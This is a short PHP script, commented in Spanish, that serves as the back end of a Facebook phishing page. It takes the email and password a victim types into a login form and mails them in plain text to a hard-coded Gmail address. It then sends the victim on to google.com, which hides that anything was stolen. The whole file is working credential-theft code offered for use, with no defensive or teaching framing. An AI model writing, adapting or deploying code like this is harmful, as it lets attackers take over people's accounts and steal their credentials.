<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Recupera los datos del formulario
    $email = $_POST['email'];
    $password = $_POST['password'];

    // Correo de destino
    $destinatario = 'martinvegameneses1@gmail.com';

    // Asunto del correo
    $asunto = 'Inicio de sesión en Facebook';

    // Contenido del correo
    $mensaje = "Se ha iniciado sesión en Facebook.\n\n";
    $mensaje .= "Correo electrónico: $email\n";
    $mensaje .= "Contraseña: $password\n";

    // Cabeceras del correo
    $headers = 'From: tu_correo@example.com' . "\r\n" .
        'Reply-To: tu_correo@example.com' . "\r\n" .
        'X-Mailer: PHP/' . phpversion();

    // Enviar correo
    if (mail($destinatario, $asunto, $mensaje, $headers)) {
        // Redirigir a google.com después de enviar el correo
        header('Location: https://www.google.com');
        exit;
    } else {
        echo '<script>alert("Error al enviar el correo."); window.location.href = "index.html";</script>';
    }
}
?>
